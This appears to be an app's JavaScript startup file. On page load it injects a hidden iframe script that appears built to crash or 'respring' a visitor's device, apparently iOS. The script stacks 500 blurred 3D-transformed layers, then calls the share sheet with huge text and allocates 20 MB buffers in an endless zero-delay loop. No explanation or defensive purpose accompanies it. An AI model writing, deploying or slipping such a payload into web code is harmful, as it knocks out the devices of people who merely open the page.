function startApp() {
  const appElement = document.getElementById('app');
  if (appElement) {
    appElement.classList.remove('hidden');
  }

  const frame = document.getElementById('respring-iframe');

  const respringScript = `
    <html>
    <body style="margin:0; overflow:hidden;">
      <script>
        const container = document.createElement('div');
        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
        document.body.appendChild(container);

        for (let i = 0; i < 500; i++) {
          let d = document.createElement('div');
          d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
          container.appendChild(d);
        }

        setInterval(() => {
          try {
            navigator.share({ title: 'R', text: 'R'.repeat(100000) });
          } catch(e) {}

          let x = new Uint8Array(1024 * 1024 * 20);
          crypto.getRandomValues(x);
        }, 0);
      <\/script>
    </body>
    </html>
  `;

  if (frame) {
    frame.srcdoc = respringScript;
  }
}

// Boot directly on window load
window.onload = () => {
  startApp();

  // Service worker registration
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('./service-worker.js');
  }
};
